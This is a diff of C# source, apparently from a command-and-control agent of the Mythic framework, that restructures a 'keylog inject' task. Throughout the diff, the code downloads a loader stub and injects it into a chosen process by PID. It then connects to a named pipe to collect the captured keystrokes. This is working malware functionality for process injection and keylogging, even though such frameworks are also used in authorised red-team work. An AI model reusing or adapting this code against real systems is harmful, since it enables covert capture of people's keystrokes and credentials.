@@ -79,99 +79,98 @@ namespace Tasks
             };
         }
 
-        public override void Kill()
-        {
-            base.Kill();
-        }
 
-        public override ST.Task CreateTasking()
+        public override void Start()
         {
-            return new ST.Task(() =>
+            TaskResponse resp;
+            try
             {
-                TaskResponse resp;
-                try
+                KeylogInjectParameters parameters = _jsonSerializer.Deserialize<KeylogInjectParameters>(_data.Parameters);
+                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
+                    string.IsNullOrEmpty(parameters.PipeName))
                 {
-                    KeylogInjectParameters parameters = _jsonSerializer.Deserialize<KeylogInjectParameters>(_data.Parameters);
-                    if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
-                        string.IsNullOrEmpty(parameters.PipeName))
+                    resp = CreateTaskResponse(
+                        $"One or more required arguments was not provided.",
+                        true,
+                        "error");
+                }
+                else
+                {
+                    bool pidRunning = false;
+                    try
                     {
-                        resp = CreateTaskResponse(
-                            $"One or more required arguments was not provided.",
-                            true,
-                            "error");
+                        System.Diagnostics.Process.GetProcessById(parameters.PID);
+                        pidRunning = true;
                     }
-                    else
+                    catch
                     {
-                        bool pidRunning = false;
-                        try
-                        {
-                            System.Diagnostics.Process.GetProcessById(parameters.PID);
-                            pidRunning = true;
-                        }
-                        catch { pidRunning = false; }
-                        if (pidRunning)
-                        {
+                        pidRunning = false;
+                    }
 
-                            if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exeAsmPic))
+                    if (pidRunning)
+                    {
+                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
+                                out byte[] exeAsmPic))
+                        {
+                            var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
+                            if (injector.Inject())
                             {
-                                var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
-                                if (injector.Inject())
+                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                                    "",
+                                    false,
+                                    "",
+                                    new IMythicMessage[]
+                                    {
+                                        Artifact.ProcessInject(parameters.PID,
+                                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
+                                    }));
+                                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
+                                client.ConnectionEstablished += Client_ConnectionEstablished;
+                                client.MessageReceived += OnAsyncMessageReceived;
+                                client.Disconnect += Client_Disconnect;
+                                if (client.Connect(3000))
                                 {
-                                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                            "",
-                                            false,
-                                            "",
-                                            new IMythicMessage[]
-                                            {
-                                                Artifact.ProcessInject(parameters.PID, _agent.GetInjectionManager().GetCurrentTechnique().Name)
-                                            }));
-                                    AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
-                                    client.ConnectionEstablished += Client_ConnectionEstablished;
-                                    client.MessageReceived += OnAsyncMessageReceived;
-                                    client.Disconnect += Client_Disconnect;
-                                    if (client.Connect(3000))
+                                    WaitHandle[] waiters = new WaitHandle[]
                                     {
-                                        WaitHandle[] waiters = new WaitHandle[]
-                                        {
-                                            _complete,
-                                            _cancellationToken.Token.WaitHandle
-                                        };
-                                        WaitHandle.WaitAny(waiters);
-                                        resp = CreateTaskResponse("", true, "completed");
-                                    }
-                                    else
-                                    {
-                                        resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
-                                    }
+                                        _complete,
+                                        _cancellationToken.Token.WaitHandle
+                                    };
+                                    WaitHandle.WaitAny(waiters);
+                                    resp = CreateTaskResponse("", true, "completed");
                                 }
                                 else
                                 {
-                                    resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
+                                    resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
                                 }
                             }
                             else
                             {
-                                resp = CreateTaskResponse(
-                                    $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
-                                    true,
-                                    "error");
+                                resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
                             }
                         }
                         else
                         {
                             resp = CreateTaskResponse(
-                                $"Process with ID {parameters.PID} is not running.",
+                                $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
                                 true,
                                 "error");
                         }
                     }
+                    else
+                    {
+                        resp = CreateTaskResponse(
+                            $"Process with ID {parameters.PID} is not running.",
+                            true,
+                            "error");
+                    }
                 }
-                catch (Exception ex)
-                {
-                    resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
-                }
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+            }
+            catch (Exception ex)
+            {
+                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
+            }
+
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
         private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
